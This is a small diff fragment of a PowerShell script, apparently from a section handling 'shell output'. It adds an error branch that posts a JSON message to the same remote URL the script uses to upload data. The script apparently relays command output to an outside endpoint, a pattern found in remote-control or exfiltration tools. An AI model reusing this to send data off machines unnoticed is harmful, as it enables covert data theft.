@@ -37,6 +37,12 @@ shell output:
                 Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $body -ContentType "multipart/form-data; boundary=$boundary"
 
             } catch {
+                $body = @{
+                    "content" = "error"
+                }
+        
+                $bodyJson = $body | ConvertTo-Json
+                Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $bodyJson -ContentType "application/json"
             }
         }
     }
